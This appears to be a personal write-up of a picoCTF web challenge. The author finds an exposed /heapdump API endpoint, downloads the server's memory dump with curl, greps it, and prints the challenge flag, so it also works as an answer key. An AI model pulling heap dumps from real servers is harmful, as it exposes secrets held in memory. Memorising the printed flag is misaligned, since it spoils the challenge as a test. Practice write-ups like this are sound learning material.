# URL
https://play.picoctf.org/practice/challenge/476?category=1&page=1
# Challenge
Welcome to the challenge! In this challenge, you will explore a web application and find an endpoint that exposes a file containing a hidden flag.
The application is a simple blog website where you can read articles about various topics, including an article about API Documentation. Your goal is to explore the application and find the endpoint that generates files holding the server’s memory, where a secret flag is hidden.
The website is running picoCTF News.
# Method of solving
* First, I decided to play around with the website, Ctrl+U, Inspect, etc. This led me to eventually click the #API_Documentation that led me to this:
* This page is the "detailed overview of the available API endpoints for managing and retrieving news posts". Hmmm. That feels super insecure.
* Exploring different API's, the one that stuck out to me was the /heapdump, as the hints refer to some "dumping"
  ```
  curl -X 'GET' \
  'http://verbal-sleep.picoctf.net:49588/heapdump' \
  -H 'accept: */*'
  ```
  * This command allowed me to get the heapdump; however, it contained too much data, so I piped it, used grep specifically to locate picoCTF{} flag
  ```
  curl -X 'GET' \
  'http://verbal-sleep.picoctf.net:49588/heapdump' \
  -H 'accept: */*' | grep pico
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0 8993k    0  1056    0     0    394      0  6:29:34  0:00:02  6:29:32   394picoCTF{Pat!3nt_15_Th3_K3y_63fa652c}
  ```
  * Thats the flag! picoCTF{Pat!3nt_15_Th3_K3y_63fa652c}
